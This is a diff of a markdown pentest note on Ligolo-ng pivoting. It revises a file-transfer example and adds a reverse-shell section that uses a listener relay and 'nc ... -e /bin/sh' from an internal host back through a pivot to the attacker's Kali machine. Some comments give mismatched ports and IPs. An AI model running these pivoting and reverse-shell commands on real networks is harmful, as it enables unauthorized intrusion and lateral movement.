@@ -78,7 +78,7 @@ ligolo-ng » session
 # Now we are able to access the network 172.16.150.0/24
 ```
 
-## File Transfers Example with Single Pivot
+## File Transfer Example with Single Pivot
 In this example:
 - We got access into the Host B 172.16.150.20 (We are inside its CLI).
 - We previously set up our Pivot Host A, in this case 172.16.150.10.
@@ -86,14 +86,24 @@ In this example:
 
 To achieve that, we will create a new listener in our active Ligolo-Ng session:
 ```shell
-# Create new listener - Port 1236 on Kali will be the Port 9003 on the Pivot Target
+# Create new listener - Port 1234 on Kali will be the Port 9001 on the Pivot Host A
 # Enter the following on the running active Kali Ligolo-Ng session
-listener_add --addr 0.0.0.0:1236 --to 0.0.0.0:9003
-# Start Python server on Kali using Port 1236
-python3 -m http.server 1236
+listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:9001
+# Start Python server on Kali using Port 1234
+python3 -m http.server 1234
 # From the Host B CLI, access Python server through Port 9003 at the Pivot Host
-wget http://172.16.150.10:9003/test.txt
+wget http://172.16.150.10:9001/test.txt
 ```
 
 ## Reverse Shell Example with Single Pivot
-
+Following the example above, we will create a new listener, but this time we will use that listener to get a Reverse Shell:
+```shell
+# Create new listener - Port 1235 on Kali will be the Port 9002 on the Pivot Host A
+# Enter the following on the running active Kali Ligolo-Ng session
+listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:9002
+# Start nc listener on Kali Port 1345
+nc -lvnp 1235
+# Enter the following at Linux CLI on Host B to access the nc listener through Pivot Host A Port 9002
+nc 172.16.150.10 9002 -e /bin/sh
+# Now we successfully got a shell from the Host B (172.16.50.20) to our Kali
+```
